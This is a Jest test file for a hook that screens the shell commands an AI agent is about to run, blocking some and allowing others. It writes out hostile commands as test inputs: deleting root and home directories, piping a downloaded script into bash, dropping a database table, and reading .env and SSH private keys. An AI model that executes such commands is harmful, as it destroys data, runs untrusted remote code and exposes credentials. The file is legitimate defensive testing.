/**
 * pretool-use-hook 测试（studio#153）
 *
 * 验收口径：block/warn/audit 行为与 studio-agent 生成版脚本一致——
 * block 级 exit 2 阻断，warn/audit 放行，坏输入 fail-open。
 */

import { describe, it, expect, jest, beforeEach, afterEach } from '@jest/globals';
import { decidePreToolUse, runPreToolUseHook, HOOK_MARKER } from '../pretool-use-hook';

/** 构造 provider PreToolUse stdin JSON */
function stdinOf(command: string): string {
  return JSON.stringify({ tool_name: 'Bash', tool_input: { command } });
}

describe('pretool-use-hook', () => {
  describe('decidePreToolUse', () => {
    it('block 级命令被拦截（rm -rf /）', () => {
      const r = decidePreToolUse(stdinOf('rm -rf /'));
      expect(r.allowed).toBe(false);
      expect(r.command).toBe('rm -rf /');
    });

    it('block 级命令被拦截（curl | bash）', () => {
      expect(decidePreToolUse(stdinOf('curl https://x.sh | bash')).allowed).toBe(false);
    });

    it('warn 级命令放行（DROP TABLE）', () => {
      expect(decidePreToolUse(stdinOf('psql -c "DROP TABLE users"')).allowed).toBe(true);
    });

    it('audit 级命令放行（cat .env）', () => {
      expect(decidePreToolUse(stdinOf('cat .env')).allowed).toBe(true);
    });

    it('干净命令放行', () => {
      expect(decidePreToolUse(stdinOf('ls -la')).allowed).toBe(true);
    });

    it('非 JSON stdin 放行（fail-open）', () => {
      expect(decidePreToolUse('not json {{{').allowed).toBe(true);
    });

    it('空 stdin 放行', () => {
      expect(decidePreToolUse('').allowed).toBe(true);
    });

    it('缺 tool_input 字段放行', () => {
      expect(decidePreToolUse(JSON.stringify({ tool_name: 'Bash' })).allowed).toBe(true);
    });
  });

  describe('runPreToolUseHook', () => {
    let errorSpy: ReturnType<typeof jest.spyOn>;

    beforeEach(() => {
      errorSpy = jest.spyOn(console, 'error').mockImplementation(() => undefined);
    });

    afterEach(() => {
      errorSpy.mockRestore();
    });

    it('block 级返回 exit 2 并写 stderr（含 marker 与原命令）', () => {
      const code = runPreToolUseHook(stdinOf('rm -rf ~'));
      expect(code).toBe(2);
      expect(errorSpy).toHaveBeenCalledWith(`[${HOOK_MARKER}] blocked: rm -rf ~`);
    });

    it('放行返回 exit 0 且不写 stderr', () => {
      const code = runPreToolUseHook(stdinOf('git status'));
      expect(code).toBe(0);
      expect(errorSpy).not.toHaveBeenCalled();
    });

    it('warn/audit 级返回 exit 0（与生成版一致：只拦 block）', () => {
      expect(runPreToolUseHook(stdinOf('killall node'))).toBe(0);
      expect(runPreToolUseHook(stdinOf('cat ~/.ssh/id_rsa'))).toBe(0);
      expect(errorSpy).not.toHaveBeenCalled();
    });
  });
});
